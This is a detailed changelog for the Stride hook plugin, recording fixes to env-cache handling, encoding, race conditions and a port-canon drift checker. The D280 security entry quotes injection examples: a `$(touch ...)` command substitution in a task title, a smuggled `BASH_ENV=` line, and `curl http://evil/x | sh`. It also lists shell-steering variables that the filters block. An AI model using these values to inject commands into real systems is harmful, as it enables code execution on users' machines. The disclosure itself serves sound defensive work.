# Changelog

All notable changes to the Stride plugin will be documented in this file.

## Release record — tags without a GitHub release

*This is a record-keeping note, not a release. It describes no change to this plugin and carries no version.*

A fleet-wide audit found **6 tags** in this repository that are tagged and pushed but have no corresponding GitHub release. **The gap is accepted and will not be backfilled.** It is recorded here so the next release engineer does not rediscover and re-litigate it:

- `v1.7.4` — 2026-04-14
- `v1.7.5` — 2026-04-14
- `v1.9.0` — 2026-04-16
- `v1.9.1` — 2026-04-17
- `v1.12.0` — 2026-05-08
- `v1.13.0` — 2026-05-19

Why accepted rather than backfilled:

- **Nothing resolved through these releases.** A GitHub release is a human-readable record, not a resolution mechanism — nothing installs *through* one. The missing releases cost nothing at the time and cost nothing now.
- **Backfilling would be worse than the gap.** A release created today against a commit from April or May would be dated today, and would manufacture a record for a state no user ever resolved through — misrepresenting the very history it claims to document.
- **The convention itself is unchanged.** These are omissions from a few release cycles, not a policy shift. Every tag still gets a release going forward.

The audit also found **zero** GitHub releases without a matching tag, so the record is incomplete in only this one direction.

## [1.71.0] - 2026-08-23

### Added

- **`scripts/check-port-canon.ps1` — the PowerShell half of the port-canon
  drift check, and the two halves are now cross-verified against each other
  (W2107).** `check-port-canon.sh` shipped without a counterpart, so Windows
  users had no drift check at all and nothing in either suite proved the
  checker still worked. The new half is an **independent implementation**, not
  a transliteration: the bash half tokenises the canon's json with `awk`, this
  one builds an object graph with `ConvertFrom-Json`. Two readings of one
  document that reach the same verdict are worth more than one reading run
  twice, and the suites hold them to it.

  - **Gated as a self-test, never as the fleet scan.** The fleet scan's correct
    result today is exit 1, so registering it would have installed a
    permanently-red group, which teaches people to ignore the suite. Both
    halves' self-tests now run as bash Test Group 30 and PowerShell Test
    Group 32, in both suites.
  - **The cross-verification is the point.** `30c`/`32c` compare the two
    halves' case-name sets, so a case renamed or lost on one side goes red —
    which neither half's own tally can see, each being internally consistent
    while disagreeing with the other. `32d` runs both against one fixture tree
    across all three exit tiers and compares exit codes, tally counts, verdict
    lines and work lists. Both halves also agree line for line over the real
    fleet; that is the strongest evidence available and is precisely what
    cannot be a test group, because it is red by design.
  - **100 self-test cases, mirrored by outcome rather than by mechanism.**
    Including the ones that exist only because of `awk`/`grep` mechanics this
    half does not have — the tab/newline record-forgery pair, the entry-id
    charset refusal. A refusal is a verdict: a canon that halts the bash half
    at exit 2 has to halt this one too, or the pair disagrees on a real input.
    The task specification said the bash half had 37 cases; it has 100, which
    is what was mirrored.
  - **The seven false-green classes W2108 closed in the bash half are closed
    here on their own terms**, because PowerShell reaches that shape more
    easily than bash does rather than less: `-ErrorAction SilentlyContinue`
    turns any read failure into `$null`, which is falsy, which reads as clean.
    Files are read as bytes in `try`/`catch` with an `unreadable` sentinel
    distinguishable from an empty file; a NUL byte refuses the file; decoding
    is ISO-8859-1 rather than UTF-8, following D281's decided answer, because
    `UTF8.GetString` maps invalid bytes to U+FFFD and can vanish content; the
    tree is enumerated ONCE and both passes consume that one walk with its
    status carried alongside.
  - **Three failure modes that are PowerShell's alone**, which fidelity to the
    bash half would not have caught. `-eq`/`-match` are case-INSENSITIVE by
    default, so `"Required"` and `"ANCHOR"` would sail past a closed-vocabulary
    check the bash half refuses — every id, status, variant, check, provenance
    and schema comparison uses `-ceq`/`-cmatch`, and the self-test harness had
    the same bug, caught live when a refutation for `/MISSING/` matched
    `missing 0` in the tally. Without `Set-StrictMode` a missing json key reads
    as `$null`, indistinguishable from a key legitimately holding null, so key
    presence is tested through `psobject.Properties`. And a CRLF checkout stops
    an end-of-line anchor matching, so lines are trimmed of `\r` on split.
  - **`SUITE_WALL_BASELINE_S` raised from 100 to 175.** The two self-tests add
    about a minute per suite — roughly 9s for the bash half and 55s for the
    PowerShell half, which re-execs its own script once per case group.
    Trimming cases to fit the old number was the alternative and is the wrong
    trade: the count is the coverage.
  - Documented in README alongside its siblings, including that the fleet scan
    remains ungated and why. The bash suite's stale claim that Group 28 is
    bash-only "as with Group 29" — which W2105 could not correct from the ps1
    side and recorded here instead — is now corrected in place.

## [1.70.0] - 2026-08-21

A hook-executor correctness window: six defects, four of them silent data-loss
paths that produced a success-shaped result. Both suites grew with them — bash
787 → 825 assertions, PowerShell 961 → 1053 — and every fix below was verified
red against the pre-fix tree rather than argued.

### Fixed

- **Every file under a non-ASCII path lost 100% of its diff content, silently, on every macOS and Linux agent (D278).** `capture_changed_files` listed paths without `-z`, so git returned the octal-escaped display spelling for any path holding a byte `>= 0x80` (`core.quotePath`, default true). That spelling was written into the snapshot as the entry's path **and** fed back to `git diff -- <path>`, which matches nothing, because the quoted form is not a valid pathspec — so the entry carried a fabricated path and an empty diff. Ten call sites move to `-z` and read NUL-delimited into bash arrays: eight in `capture_changed_files` and two in `record_dirty_baseline`. The baseline is not optional collateral — capture string-compares each baseline path against its own now-raw path, so leaving it quoted would have made the W1457 pre-existing-edit filter inert for exactly the paths this fixes.
  - Two things the switch forced. A scalar `$(...)` cannot hold a NUL-delimited list, hence arrays and `while IFS= read -r -d ''`. And macOS BSD awk does not honour `RS="\0"` — verified, it stops at the first NUL — so the dedupe and artifact-exclusion pass is hand-rolled bash; its membership index stays newline-delimited, the same imprecision the awk pass had for a path containing a literal newline.
  - **A renamed binary was leaking a raw `Binary files ... differ` body**, live and independent of any non-ASCII path: a rename emits three NUL tokens where an ordinary entry emits one, so the previous fixed-three-field TAB scan could never match it and it escaped the placeholder. Binary detection is now a rename-aware walk over `--numstat -z`, ported from the ps1's `Get-NumstatBinarySet`.
  - Nine new Group 7 cases (`7x`–`7ff`): non-ASCII filename, ASCII file under a non-ASCII directory, untracked, binary, renamed binary, text rename, a `core.quotePath=false` non-regression, the baseline/capture interaction in both filter directions, and a live **bash-versus-PowerShell parity** check over one non-ASCII fixture. The parity case compares semantic shape, never raw diff text — git's own patch headers echo `core.quotePath`, so a byte comparison would fail on a difference the criterion does not care about — and it hard-fails on an incomplete AST extraction rather than comparing, because `[] == []` is the vacuous pass it exists to avoid.

- **A long single-line diff burned the entire 120s `after_doing` budget inside the line counter (D279).** `capture_changed_files` sized each diff by substituting the newlines out and differencing the lengths, which builds a second copy of the whole body; on a long line bash's substitution goes quadratic, and because the hook runs under a wall-clock budget the failure is silent — the hook is killed, the completion still succeeds, and Review shows no diffs with nothing saying why. Profiled before rewriting, on a real 200KB single-line diff: `git diff --no-index` 34 ms, the binary probe 30 ms, the jq encode 35 ms, **the line-count substitution 37,063 ms**. Measured end to end: 100KB 9,529 → 116 ms, 200KB 37,488 → 127 ms, 400KB `> 120s` → 157 ms, linear from there.
  - The replacement is `printf '%s\n' "$diff_text" | wc -l`, the idiom this file already uses in four other places, and it is arithmetically identical to what it replaces — verified equal on empty, one-line, trailing-newline and no-trailing-newline bodies and at the 499/500/501/750 truncation boundaries. The 500-line contract is untouched.
  - The suite's `trunc_diff_inline` is a hand-duplicated mirror of this code that Group 7's truncation cases call **instead of** the real function, so it is fixed in the same commit; otherwise those cases would have kept exercising the quadratic path and proving nothing about the fix. `7gg` fails at 147s against the pre-fix code, past both its own 30s ceiling and the 120s budget the hook enforces.

- **The hook-env key filter was a deny-list over an open-ended dangerous set (D275).** `extract_hook_env` fenced `HOOK_NAME` and five client-owned record families and passed everything else matching a shell-identifier shape. Everything that got through is `eval`'d under `set -a` **and** appended to `.stride-env-cache`, which is `.`-sourced under `set -a` on every later invocation — so `PATH`, `BASH_ENV`, `ENV`, `IFS`, `SHELLOPTS`, `LD_PRELOAD`, `DYLD_*`, `GIT_SSH_COMMAND`, `GIT_EXTERNAL_DIFF`, `GIT_CONFIG*` and `PS4` all reached both sinks from an API response body, durably. Both executors now allow exactly the 17 names in the Variable Inventory in `skills/stride-workflow/hook-execution.md` — **exact names, not prefixes**, because a `TASK_*` prefix rule would readmit the very client-owned families the old filter had to enumerate one by one.
  - The ps1 match is case-**insensitive** on purpose and has no bash equivalent: Windows environment variable names are case-insensitive, so `pAtH` *is* `PATH`, and a case-sensitive test would admit it as an unrecognised name and then collide on assignment.
  - 16 new cases (bash `9j`–`9n`, PowerShell `23c3`) cover both sinks, assert all 17 documented keys **per key** — omitting one is how an allow-list silently breaks a shipped hook — and carry a drift guard in each suite comparing the allow-list against the documented table it was hand-copied from. Three defects in those tests were found by running them: the bash env-cache case first passed against the pre-fix deny-list (an unwritten cache contains no dangerous key either, and pre-fix the write never happened because letting `PATH` through breaks the cache writer's own `mktemp`/`awk`/`mv`), so it now carries a non-vacuity guard; the ps1 case asserted a client-written `TASK_BASE_REF` was absent when it is supposed to be present, and now targets the property that matters — the server's forged value must not win; and the ps1 drift guard matched case-insensitively, PowerShell's default, sweeping unrelated lowercase doc-table words into the comparison.
  - A follow-up round removed the one part of that change that would not have run on the shipping host: the new drift guard resolved its doc path with a 3-argument `Join-Path`, which binds the PowerShell 6+ `-AdditionalChildPath` and is a parameter-binding error on 5.1 — terminating the run, not skipping the case, under the suite's `$ErrorActionPreference = 'Stop'`. It was the only multi-argument `Join-Path` in either ps1 file.

- **`Invoke-WebRequest -SkipHttpErrorCheck` is PowerShell 7.0+, and `stride-hook.sh` execs `powershell.exe` (D277).** On the shipping 5.1 host the parameter never bound, so the cmdlet never ran: every `changed_files` PUT recorded `000`, and the after_goal detection call — which sits under `catch { return }` — made D119 a silent no-op on every native-Windows run. Both sites now go without it; a non-2xx throws on either host and `Get-WebExceptionStatus` recovers the real code from `.Exception.Response.StatusCode`. The transport case reaches `000` by a different route on each host and the comment now says which is which: 5.1's `WebException` **has** a `.Response` that is null, while 7's `HttpRequestException` has no such property at all, so under `Set-StrictMode -Version Latest` the access throws and the inner catch is what answers.
  - **Test Group 30 is the regression cover the static gate structurally cannot give**, since `PSUseCompatibleCmdlets` checks cmdlet *names* and never parameters. It walks the AST of every shipped ps1 against a per-cmdlet denylist, abbreviation-aware and alias-resolved — review caught that keying on the written name let `iwr -SkipHttpErrorCheck`, the defect itself one keystroke shorter, pass clean — and it catches the positional form that cost D275 a round. `30d` plants all three violations and runs them through the same function the real assertions call, so a silently-broken walk goes red instead of green.
  - The denylist is **incomplete by construction** and now says so in all three places that describe it. Honest limit: `30e`/`30f` are not red against the pre-fix code on this host, because pwsh 7 binds the parameter — the defect was only ever observable on 5.1, and nothing here has been executed under `powershell.exe` (D237). The pre-fix red evidence is `30a`–`30d`, which fail on any host.

- **The two executors disagreed about what a `.stride-env-cache` record says, and a ps1 write destroyed unrelated records (D281).** `stride-hook.ps1` read the cache with `UTF8Encoding.GetString`, whose invalid-byte fallback is REPLACEMENT, and wrote it back with `WriteAllText` — so any byte that was not valid UTF-8 became `U+FFFD` on read and `EF BF BD` on write, while bash's byte-oriented `grep -v` left it untouched. The cache is the anchor for snapshot bases and window attribution. The fix is an ISO-8859-1 (code page 28591) storage projection, which is bijective over `0x00`–`0xFF`: read-then-write is lossless for every byte sequence. This is not an approximation of bash's semantics, it **is** them — bash preserves bytes because grep, awk and printf operate on bytes.
  - **The boundary discipline is the one thing this design can get wrong, so it is enumerated rather than left to care.** Two IN projections (the claim identity block via `$flat`, and `Set-HookEnv`), two writers that are ASCII-by-construction with the reason recorded at each, and one OUT — the bulk loader's `SetEnvironmentVariable`, without which every non-ASCII value reaches section children as mojibake. `Write-EnvCache` gains a guard: a character above `U+00FF` means the line never passed its IN boundary, so it refuses the whole write and keeps the previous cache. Deliberately not auto-repaired, because "every char `<= U+00FF`" cannot distinguish a projected byte-string from an unprojected `café`.
  - A written decision now sits above `Write-EnvCache` ruling the three axes where the executors could differ: bash wins line terminators and the encoding signature; multi-line values split — bash wins the file format, the ps1 wins its own writes — and that asymmetry is permanent, because `ConvertTo-FlatEnvValue` is half of what closed D280's `BASH_ENV` route. **bash is unchanged**: 27 added lines, 0 deleted, 0 non-comment.
  - Tests were written first, against unmodified code, with the red list recorded before a line of production code changed. Review then found two of them wrong in ways that mattered: `23c5` compared a non-ASCII PowerShell literal against captured bash stdout, which decodes through `[Console]::OutputEncoding` and would have gone **red on a correct implementation** on 5.1; and `22h6c` compared two captures through the same decoder, so pre-fix bytes that genuinely differ (`caf<E9>` versus `caf<EF BF BD>`) both rendered as `caf?` and the case was green either way — green on an empty capture too. Both now compare bytes through files, with non-vacuity guards, and the cross-executor case is proven two-sided by mutation.
  - `7ii` pins the grep property this fix makes matter. The testing leg as worded — locale sensitivity in bash's grep — was measured and **does not reproduce** on the shipping path. The real hazard is a grep that refuses binary input: through the record-writer idiom, a grep that emits nothing does not merely drop the invalid byte, it commits an empty stdin over every unrelated record, silently, with exit 0. Reproduced with a shim. D281 makes that hazard *more* reachable, not less, because invalid bytes now persist instead of being scrubbed on the next write. Whether the four writer sites should guard rather than detect is filed as **D288** with the measurements.

- **A record write could silently discard a concurrent claim, because it rewrote the whole cache with no check that anything had moved underneath it (D282).** W2102 gave the record writers their first production call sites, all inside `Invoke-FinalizeAfterDoing`, which runs twice per completion and holds a read across `Build-ChangedFilesSnapshot` — a git shell-out. A claim from a second agent in the same checkout landing in that window was lost wholesale. Before W2102 the writers had no call sites and the window was unreachable, which is why this shipped.
  - **The obvious fix rests on a false premise**, and the source already half-knew: there is no "additive bash shape" to match — `record_task_head_ref` pipes `grep -v` into `write_env_cache`, which is the same unlocked read-filter-rewrite. A stale in-source comment asserting otherwise is gone. A `FileShare.None` lock was rejected because it closes ps1-versus-ps1 and cannot coordinate with a concurrent **bash** writer in a mixed checkout, which is the case that motivates the defect.
  - `Set-TaskRecord` now captures the cache's raw bytes and `Write-EnvCache` re-reads and compares them immediately before the rename, so the window is one `Move-Item` rather than a read, a filter and a file write. Each retry re-reads and re-applies against the *other* writer's content rather than replaying a stale snapshot — that distinction is what makes the loop a fix rather than a repeat. Three collisions refuses instead of clobbering. Stated in the code rather than implied: this **narrows** the race, it does not make the write atomic.
  - Three review rounds each found the test unable to catch the bug it was written for, and each is recorded rather than quietly corrected. The concurrent write must land after the **splitter** has read, not merely after the fingerprint, or attempt 1 already stages fresh content and the retry carries nothing — measured against a mutant with the guard deleted, where the earlier injection points passed 5/5. A regression introduced by the first patch is fixed rather than noted: `-PathType Leaf` is false for a **directory**, so a directory at the cache path reported ABSENT, the swap matched "expected absent", `Move-Item` relocated the staged temp *into* it, and the write returned SUCCESS over a cache that does not exist as a file. The old code failed safe and the new code failed success-shaped, which is the exact defect class the task exists to close. And PowerShell unrolls a returned array, so a zero-byte cache came back as `$null`, indistinguishable from absent — reachable through `Write-EnvCache -Lines @()`, and now pinned.
  - The criterion is directional and that direction is closed and measured. The reverse is open: five `Write-EnvCache` callers still pass no `-CompareAndSwap`, so a claim-side or finalize-side rewrite can discard a record write in its window. Filed as **D289** with the per-caller reasons and the sink-side alternative costed, rather than widened here. The non-CAS stranding mechanism is pre-existing and belongs to that defect too.

## [1.69.0] - 2026-08-20

### Added

- **A canonical cross-port rules document, `docs/port-canon.md`.** Five rules the defect record had already forced across the fleet one port at a time — the failed-verdict note rule (D222/D231/D240), the decision matrix as sole decision point (D221/D232), row precedence (D253), the `reason_code` vocabulary (D239) and fence nesting (D243/D217) — now have one place that says what each rule is, which ports owe it, and who owns its wording. The canon owns substance and applicability; ports keep their own voicing, per the D240 precedent. Applicability is a fenced JSON block per entry with a fixed key set, so a consumer reads every entry the same way: the first block is the port registry, each block after it is one rule, and every entry lists all nine registry ports in registry order. That absorbs the one-family, zero-port, structural-variant and not-yet-scaffolded cases inside the format instead of as prose exceptions — `stride-opencode-lite` is recorded with `exists: false` and deferred everywhere, so G403 shipping flips two fields rather than reworking the matrix.
  - Two task-description claims were corrected against the actual trees while writing it, and a later exploratory session found six more defects in the document's own new lines, every one fixed in place rather than filed. The sharpest: the `stride-pi` row for the verdict-note rule was wrong on all three of its assertions — that port does have an agents directory, nested under `extensions/subagent-dispatch/`; the file the row named as the section-verdict host contains no occurrence of the rule, while the nested reviewer carries it five times and enumerates four section tiles rather than five. A maintainer trusting the old row would have anchored a fallback path and left the real reviewer prompt unanchored.
  - The registry's `dir` field is constrained to a single path segment — no separator, no `..`, no leading slash — because the registry tells a consumer to resolve it against the parent of the stride repo root, deliberately outside its own repository. A specialist security pass raised that as a low finding in the new lines and it was closed in place: one check on every entry, so a consumer has no special cases.

- **A drift check that turns the canon into an enforced contract, `scripts/check-port-canon.sh`.** It reports MISSING, STALE, UNEXPECTED, DEFECT or UNVERIFIABLE per port per rule, covers the vendored catalog copies as well as the ports, and exits non-zero when any applicable cell is not clean. Parsing is a self-contained awk program that accepts exactly the canon's closed schema and hard-halts on anything else — an unknown key, an out-of-vocabulary value, an `applies_to` list out of registry order — so a malformed canon stops the run rather than being parsed optimistically. Blocks are classified by their own discriminator, never by position.
  - **The gate was hardened across five adversarial rounds, and every round found real false greens — runs that reported a clean fleet over ports that were not clean.** Round 1 closed a canon self-exclusion that compared unnormalised paths, so running the check from inside the stride repo reported that port compliant off the canon's own definition site. Rounds 2 and 3 closed canon- and filename-channel read-scope escapes, including a `..` segment that passed both the character-set check and the shell-side re-validation, and a filename containing a newline that made the gate read a file outside the scanned tree and attribute it to a port. Round 4 closed a time-of-check/time-of-use race in round 3's own guard, reproduced 2 times in 30 blind runs under churn. Round 5 was two independent security auditors, one given a value-flow map and one given nothing, who converged on a single root shape: **`find` succeeding was being read as "the tree was examined", so every read failure below it collapsed into the same empty output a clean file produces.** Eight more false greens fell out of that, each reproduced before and after — a `chmod 000` file holding a real violation flipped exit 1 to exit 0 while the gate reported the property verified across a count that included the file nobody opened.
  - The self-test grew alongside the fixes and now runs 100 cases, proving the gate still detects each verdict class rather than only that it runs. It is deliberately **not** wired into the pass/fail hook suite: its honest result against a fleet mid-adoption is a non-zero exit, so a pass/fail group would have to be either red or lying.

- **The four canon rule anchors, adopted in this port.** `docs/port-canon.md` defines a per-rule anchor comment that lets `scripts/check-port-canon.sh` tell "this port carries the rule" apart from "nobody has checked", and this repo carried all four rules in substance while still reporting MISSING on every one of them — the anchor contract simply postdated the rules. Each anchor — an HTML comment of the form `<!-- canon:<rule-id> v1 -->` — now sits directly beside this repo's own statement of its rule, never restating it: `verdict-note` beside the Verdict-note rule in `agents/task-reviewer.md`, and `decision-matrix-authority`, `row-precedence` and `reason-code-vocabulary` beside the Step 3 decision matrix, its row-precedence ordering, and the `reason_code` vocabulary table in `skills/stride-workflow/SKILL.md`. Anchors mark presence; the per-port voicing is untouched.
  - **One anchor per rule per port directory, and the tool will not catch a violation.** The checker's lookup takes `head -1`, so a second anchor for the same rule id is silently ignored rather than flagged — the mirrored decision matrix in `skills/stride-subagent-workflow/SKILL.md` therefore gets no anchor of its own, as the canon's `row-precedence` check hint requires. This is a hand-discipline rule, not an enforced one.
  - **`docs/port-canon.md` itself stays unanchored**, because the checker excludes the definition site on purpose: anchoring it would let a port look compliant on the strength of the file that defines compliance.
  - `scripts/check-port-canon.sh` now reports `ok` on all four rows for port `stride` (previously all four MISSING), moving the fleet tally from `ok 8, missing 44` to `ok 12, missing 40`. Comment-only insertions in prose; no behaviour change, and `--self-test` still passes 100/100.

- **The drift check is now a documented release-time step**, which is what makes it happen. `scripts/check-port-canon.sh` existed and nothing obliged anyone to run it, so a future canon change could ship half-synced — the same failure this window's anchor work closes for the current rules, reopening for the next one. It is now written into the three places a maintainer actually passes through: this repo's README, beside the other gates, with its invocations, its exit codes and the warning that `2` means the run proved nothing rather than that it found nothing; and the sync checklists in `stride-codex-marketplace` and `stride-copilot-marketplace`, positioned ahead of each one's commit step so a stale vendored copy blocks the sync while re-vendoring still costs a single re-run. `docs/port-canon.md` gains a short pointer naming the gate that reads it, stopping short of restating the checker's contract, which its own Scope note forbids.
  - Deliberately **not** wired into the hook suite. The gate's honest result against a fleet mid-adoption is a non-zero exit, so a pass/fail group would have to be either red or lying; the release step is the mechanism instead, and the README says so rather than describing the check as automatic.
  - The canon's Discovery section claimed nothing in the fleet referenced the file — no port, no README, no changelog. All three clauses were or became false: the README pointer and this entry account for two, and `stride-lite`'s workflow skill already cited the canon by path and rule id where it records its `reason-code-vocabulary` deferral. The section now states the gap that is real and unchanged — no source file carries a back-reference at the **edit site**, which is the direction that would catch a maintainer mid-edit — rather than an enumeration that had stopped being true.

### Fixed

- **Two D217-shape nested fences that were silently truncating shipped instructions.** `skills/stride-workflow/parser.md` and `skills/stride-workflow/hook-execution.md` each held a three-backtick block nested inside another three-backtick block. A fence the same width as the block it sits in closes that block early, so the remainder of the file renders as prose and an agent reading it loses the rest of the instruction — live instruction-loss defects in shipped files, not cosmetic markdown. Rendering the pre-image with a CommonMark renderer shows it exactly: the sentence after the example is swallowed into a second code block. Each site was read at the reported line and confirmed a genuine same-width nesting before being changed, since the walker over-reports by design. The outer fence is widened in every case; no inner fence is narrowed, because a literal fence opener can only be shown by widening the fence around it.

## [1.68.0] - 2026-08-19

### Fixed

- **D280 — a hostile API response could execute commands on a mixed checkout, because `stride-hook.ps1` wrote server-supplied values into a file bash `source`s.** `stride-hook.sh` loads the env cache with `. "$ENV_CACHE"` under `set -a`, so every value the PowerShell side writes into that file is **shell syntax, not data**. Three write sites emitted `KEY=value` bare, and a task title of `Fix $(touch /tmp/marker)` was a command substitution bash executed at source time — confirmed executing, not theorised. The trust boundary is the Stride API response, which is precisely the input the four record families are fenced against elsewhere in the same file; these writers went around the fence entirely.
  - **Every write site now escapes, and the rule has no exceptions on purpose.** The claim identity block (all six values 100% server-supplied — the headline hole), `Set-HookEnv` (every forwarded `TASK_*`/`GOAL_*`/`BOARD_*` key), and `Invoke-FinalizeBeforeDoing`'s five base/owner keys all route through `ConvertTo-ShSingleQuoted`, the escaper W2101 added and test 22d proves byte-identical to bash's `sq_escape`. The finalize keys are locally derived (`git rev-parse HEAD`, a digits-gated owner id) and were the lowest risk of the three; they are quoted anyway, for parity with the bash twin and because a rule with one exception stops being checkable. Completeness is established by construction rather than by inspection: `Write-EnvCache` holds the only file-mutating call against the cache, it has exactly six call sites, and test **23f** fails if a seventh appears.
  - **The fix is two-sided, and either half alone is a regression.** bash gets unquoting free from `source`; this port's bulk loader is a line regex that sets the RHS verbatim, so once the writers quote, the loader must unquote or every consumer — including every `bash -c` child running a `.stride.md` section, which inherits the Process environment — starts seeing `TASK_ID='6341'` with the quotes attached. `ConvertFrom-ShSingleQuoted` is the exact inverse, **not** a `.Trim("'")`: trimming leaves the interior `\''` untouched on `'a'\''b'` and eats real data from a value that legitimately ends in a quote. A line with no surrounding quotes passes through verbatim, which is what keeps a cache written by a pre-D280 ps1 readable.
  - **Quoting and newline-flattening close different halves, and the claim block was missing the second one.** Quoting stops bash *interpreting* a value; flattening stops it becoming a second physical line. `Set-HookEnv` has flattened since W1453, but the identity block never did — so a title carrying a newline shaped like `TASK_BASE_REF_42='<sha>'` still landed a line that this port's line-oriented loader read as a record and `Resolve-TaskSnapshotBase` consumed as another task's snapshot base. The identity block now flattens as well as quotes: a deliberate divergence from the bash twin, which needs no flatten because `source` reassembles a quoted value across lines.
  - **The first patch was incomplete, and review caught it — the flatten matched LF only.** Both an independent security pass and the task review reproduced the same hole against the committed fix: `-replace "`r?`n"` **requires** a line feed, so a lone carriage return passed through untouched. Quoting still defended bash — `source` splits on LF — but quoting is irrelevant to this port's own loader, and .NET's line reader honours a bare CR as a terminator, so one logical cache line split into several records and the loader exported each. Demonstrated end to end rather than argued: a title carrying `<CR>BASH_ENV=<attacker-controlled file><CR>` planted `BASH_ENV`, which non-interactive bash sources before running a section — arbitrary command execution from a single hostile API response; a weaker variant forged `TASK_BASE_REF_99`, handing the resolver another task's snapshot base. The control run with the CR replaced by a space did neither. `ConvertTo-FlatEnvValue` is now the single flattener, covering CR, LF, NEL, LS and PS, shared by both write sites so they cannot drift apart again — they already had.
  - **The loader is hardened, because it is the amplifier rather than a bystander.** Whatever it exports lands in the environment every `bash -c` section child inherits, so a forged line there is an interpreter-steering primitive, not a bad value. It now reads through `Get-EnvCacheLine` (raw bytes, LF-only split, so a CR cannot manufacture a record — and this loader finally agrees with `Read-TaskRecord` about what a line *is*), enforces the key shape with `\z`, and refuses shell-steering names (`BASH_ENV`, `ENV`, `PATH`, `LD_PRELOAD`, `IFS`, `BASH_FUNC_*`, …). It deliberately does **not** deny the client-owned record families: those are fenced out of the *server payload* because the client owns them, but the client writes them here and `Get-TaskBaseRefFor` reads them straight back, so denying them at the loader would have silently killed the D226 snapshot-base mechanism. Test 23g pins both halves — `BASH_ENV` refused, `TASK_BASE_REF_99` still loading.
  - **Two smaller review findings, both real.** `Get-HookEnvFromPayload`'s key gate anchored with `$`, which .NET also matches before a trailing newline — a server key of `` "FOO`n" `` passed it and wrote a bare `FOO` line that bash executes as a command name. And the 23f completeness tripwire matched `Write-EnvCache\s+-Lines`, but `-Lines` binds **positionally**, so a seventh writer spelled `Write-EnvCache $newLines` would have kept it green while completeness is the very property it names; it now counts every reference and subtracts the definition.
  - **Round 2 found three more, and the fixes are what make the guarantee hold across BOTH executors.** (a) The five *pass-through* re-emits still read with `Get-Content`. Flattening only protects values this process authors, and the bash twin `sq_escape`s its identity values **without** flattening — correctly, since `source` reassembles a quoted value across a newline — so a CR-bearing title authored by bash arrived as one physical line and left as three, with `Write-EnvCache` re-joining them into a genuine `BASH_ENV=` line. All five now read through `Get-EnvCacheLine`, so every reader of this file agrees on what a line is. (b) The shell-steering **deny-list was the wrong shape**: it missed `GIT_SSH_COMMAND` and `GIT_EXTERNAL_DIFF`, each naming a program git executes, in a script that shells out to git constantly. It is now an **allow-list** of the cache's own namespace — the only shape that survives the next variable nobody has thought of. (c) The **LF route cannot be closed from this side at all**, because bash legitimately writes unflattened newlines; a strict record-shape gate closes it instead, since a forged continuation is always *bare* while every real record is quoted.
  - **A regression this work introduced, caught by the existing suite.** The first version of that shape gate matched `TASK_BASE_REF_[A-Za-z0-9_]+`, which swept in `TASK_BASE_REF_OWNER` — a control flag sharing the prefix, not a per-task record. The gate refused a bare owner line and silently disabled D226's foreign-owner refusal, until test 21cc failed. The record namespace is digits-only ids, which is all either executor's key builder will construct, and the tightened pattern is the fix.
  - **What this does NOT close, stated so the comment cannot be read as a completeness claim.** The allow-list closes the route *through the cache*. `Get-HookEnvFromPayload` fences only `HOOK_NAME`, the five record families and `STRIDE_*`, so any other server-supplied hook-env key — `BASH_ENV` and `GIT_SSH_COMMAND` included — is still exported straight into the process environment by `Set-HookEnv`, bypassing the loader. That gap is pre-existing, identical in the bash twin, and already filed as **D275** with a recorded decision to defer.
  - **Rounds 3 and 4 closed the last two promotion routes, and both were in this change's own work.** Round 3: the filters agreed on what a *line* was but not what a *record* was, so dropping a key **dismembered** a legitimately multi-line bash-authored record and `Write-EnvCache` promoted its interior — `curl http://evil/x | sh` — to a top-level line. `Split-EnvCacheRecord`, an sh quote-state scanner of the kind the bash twin has always carried, now groups physical lines into records before any of the six filters decides keep-or-drop, and fails closed when the file ends inside a quoted run. Round 4: the **loader itself** was still reading physical lines, so the four *shared* D226 control keys (`TASK_BASE_REF`, `_TRUSTED`, `_OWNER`, `_UNPROVEN`) — outside the digit-suffixed record namespace the shape gate covers — were never gated. A forged `_UNPROVEN` makes every later run refuse its own snapshot and upload an **empty** diff for the task; a forged `TASK_BASE_REF` + `_TRUSTED` anchors the diff at an attacker-chosen commit. The loader now reads records too, so an interior line stops being a candidate key at all.
  - **Three bugs this work introduced, all caught by the existing suite or by probing rather than by review.** `return ,$records` plus `@()` at every call site **nests**, and `[string[]]` stringifies the inner array with `$OFS` — silently space-joining all six identity keys onto one cache line (18 tests red). Without the comma, PowerShell unrolls an empty array to `$null`, making an empty cache indistinguishable from the unterminated-quote failure (9 more). Both are gone: the splitter returns an explicit `@{ Ok; Records }`. And the first shape gate matched `TASK_BASE_REF_[A-Za-z0-9_]+`, sweeping in the `_OWNER` **control flag** and silently disabling D226's foreign-owner refusal until test 21cc failed — the record namespace is digits-only ids.
  - **The scanner is checked against bash, not against our idea of sh.** Probing it directly found one real divergence: a trailing backslash outside quotes is an sh **line continuation**, and the scanner was closing the record there — so dropping one half of what bash reads as a single unit could leave an executable remainder. Test 23k now runs six shapes plus the fail-closed case past both the ps1 scanner and a real `bash source`, and asserts they tell the same story.
  - **The regression tests were mutation-verified, and the first draft failed that check.** Test group 23 drives a hostile value end to end and asserts the marker file is never created, the value round-trips verbatim through a real `bash source`, and the section child sees it bare. The first 23c supplied `TASK_TITLE` via *both* `data.title` and the hook env block — and passed with the identity block's escaping reverted, because `Set-HookEnv` replaces the line in place (D260) and its quoted value masked the bare one. The legs are now isolated one write site each, and all four mutants are caught: reverting the identity writer, reverting `Set-HookEnv`, dropping the loader's unquote, and dropping the flatten each turn the suite red. 23c1's marker assertion firing on the first of those is the proof the hole was real.
  - **32 existing assertions expected a bare `KEY=value` line and were updated to expect the quoted form**, plus one stale comment that documented the old shape. The assertions were updated; the quoting was not weakened to fit them.
  - ps1 suite: **749 passed, 0 failed** (was 674) — `pwsh -NoProfile -File hooks/test-stride-hook.ps1`. `hooks/stride-hook.sh` is **unchanged** — verified by `git diff --numstat HEAD -- hooks/stride-hook.sh` returning no rows. 5.1 static gate clean across all four `hooks/*.ps1`.

### Added

- **W2106 — the Windows parity statements now match the post-port reality, and what remains is named rather than implied.** G413 ported the changed-files capture (W2100), the window-classification and attribution engine (W2102), per-window eviction and the D273 replay (W2103), and pinned the D256/D271/D272 behaviours (W2104), then closed the bash-only test-group gap (W2105). Every in-code PARITY NOTE was re-read against the code rather than reflexively edited; the entries W2102 and W2103 had already moved out of *NOT PORTED* were left as they stood, because the history of a claim is worth more than a tidy list.
